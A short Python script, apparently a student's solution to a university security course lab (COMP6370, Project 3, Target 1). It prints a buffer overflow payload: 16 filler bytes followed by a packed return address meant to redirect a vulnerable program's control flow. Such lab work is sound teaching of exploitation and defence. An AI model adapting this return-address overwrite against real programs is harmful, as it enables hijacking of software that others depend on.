#!/usr/bin/env python3

#Author: Tanner Bonds
#Date: 10/24/2020
#Dr. Drew Springall - COMP6370
#Project3 - Target1

import struct
import sys

payload = (b"a" * 16) + struct.pack("<I", 0x08049c03)
sys.stdout.buffer.write(payload)
